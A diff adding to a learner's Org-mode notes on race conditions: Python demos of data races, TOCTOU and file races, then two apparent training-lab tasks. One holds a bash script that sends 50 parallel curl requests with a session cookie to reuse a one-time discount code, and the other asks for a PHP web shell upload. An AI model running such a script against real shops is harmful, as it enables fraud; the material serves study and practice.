@@ -1,4 +1,4 @@
-#+title: Race
+#+title: Race Conditions
 #+author: gabriel
 
 * intro
@@ -136,4 +136,174 @@ Therefore, having in-depth knowledge of concurrency and threading, and employing
 * types of race condition
 Race condition vulnerabilities can manifest in various forms, each with its own distinct characteristics and consequences.
 
-n this section, we will explore common types of race conditions: Data Race, Time-of-Check to Time-of-Use (TOCTOU), File System Race Conditions, and Memory Race Conditions.
+In this section, we will explore common types of race conditions: Data Race, Time-of-Check to Time-of-Use (TOCTOU), File System Race Conditions, and Memory Race Conditions.
+
+*example* ->
+Consider two threads incrementing a shared counter. Without proper synchronization, the counter's value may be different from what is expected.
+#+begin_src python
+import threading
+
+counter = 0
+
+def increment():
+    global counter
+    for _ in range(100000):
+        counter += 1
+
+threads = []
+for _ in range(2):
+    t = threading.Thread(target=increment)
+    threads.append(t)
+    t.start()
+
+for t in threads:
+    t.join()
+
+print(f"Final counter value: {counter}")
+#+end_src
+
+In this example, the expected final value is 200000, but due to the data race, the result may vary.
+
+** Time-of-check to Time-of-use (TOCTOU)
+TOCTOU vulnerabilities occur when a resource is checked for a condition (time-of-check) and then used based on that condition (time-of-use).If the state of the resource changes between these two events, it can lead to security vulnerabilities.
+
+*example* ->
+Consider a system that checks whether a user has permission to perform a certain operation. If the user's permissions change between the check and the operation, unauthorized actions could be performed.
+#+begin_src python
+import threading
+import time
+
+class User:
+    def __init__(self, user_id, is_admin):
+        self.user_id = user_id
+        self.is_admin = is_admin
+
+    def set_admin(self, is_admin):
+        self.is_admin = is_admin
+
+def check_permission_and_execute(user):
+    # Check if user is admin
+    if user.is_admin:
+        # Simulate delay
+        time.sleep(1)
+        # Execute admin task
+        print(f"User {user.user_id} performed an admin task")
+    else:
+        print(f"User {user.user_id} is not authorized")
+
+# Example usage
+user = User(1, True)
+
+# Create threads
+threads = []
+threads.append(threading.Thread(target=check_permission_and_execute, args=(user,)))
+
+# Change user permission during the check
+threads.append(threading.Thread(target=user.set_admin, args=(False,)))
+
+# Start threads
+for t in threads:
+    t.start()
+
+# Wait for all threads to complete
+for t in threads:
+    t.join()
+#+end_src
+
+This code demonstrates a TOCTOU vulnerability in a system that checks a user's permission and then performs an admin task.
+
+** File system race conditions
+This code demonstrates a TOCTOU vulnerability in a system that checks a user's permission and then performs an admin task.
+
+*example* ->
+Two processes attempting to create the same file can lead to inconsistent states or errors.
+#+begin_src python
+import os
+import threading
+
+def create_file(filepath):
+    if not os.path.exists(filepath):
+        with open(filepath, 'w') as file:
+            file.write("Hello, world!")
+
+threads = []
+filepath = "/tmp/racefile"
+for _ in range(2):
+    t = threading.Thread(target=create_file, args=(filepath,))
+    threads.append(t)
+    t.start()
+
+for t in threads:
+    t.join()
+#+end_src
+
+In this example, both threads check for the file's existence and then attempt to create it, leading to a race condition.
+
+** Memory race conditions
+Memory Race Conditions occur when multiple threads access and modify shared memory without proper synchronization.
+
+This can lead to lost updates, data corruption, and unpredictable behavior—even on CPython, where the Global Interpreter Lock (GIL) does not make compound read-modify-write operations atomic.
+
+*example* ->
+Two threads incrementing a shared counter without proper locking mechanisms.
+#+begin_src python
+import threading
+
+counter = 0
+
+def increment():
+    global counter
+    for _ in range(100_000):
+        counter += 1  # Not atomic: read -> modify -> write
+
+threads = []
+for _ in range(2):
+    t = threading.Thread(target=increment)
+    threads.append(t)
+    t.start()
+
+for t in threads:
+    t.join()
+
+print(f"Final counter value: {counter}")
+#+end_src
+
+Without proper synchronization, the final counter value may be less than the expected 200000 due to lost updates.
+
+* discount code lab
+This lab contains a vulnerability that allows a discount code to exceed its redemption limit, allowing a ticket to be purchased at a lower cost.
+
+Your starting balance is not enough to purchase the ticket. To complete the lab, use the discount code, which only has a one-time use limit, multiple times to make the ticket price affordable for your balance.
+
+What is the order number that appears after ticket purchase?
+
+*script to multiple requests with curl command* ->
+#+begin_src sh
+#!/bin/bash
+
+# Defina a URL e os dados da requisição
+URL="http://onlineticket.hv/"
+DATA="code=CODE50&useDiscountCode="
+COOKIE="PHPSESSID=1eg0vrd3obn6l5tepcs78dt9u0" # Substitua pelo seu próprio cookie de sessão
+
+# Laço de repetição para enviar 50 requisições
+for i in {1..50}; do
+  curl -s -X POST \
+       -H "Content-Type: application/x-www-form-urlencoded" \
+       -H "Cookie: $COOKIE" \
+       -d "$DATA" \
+       "$URL" &
+done
+
+# Aguarda todos os processos em segundo plano terminarem
+wait
+
+echo "Ataque de Race Condition concluído."
+#+end_src
+
+* web shell upload lab
+This lab contains a vulnerability that leads to a malicious file upload. The sample application has the functionality to upload images, but a vulnerability occurs when checking the uploaded image.
+
+To complete the lab, upload a malicious PHP script and see if you can execute commands on the server.
+
+What is the hostname address of the server where the website is running?
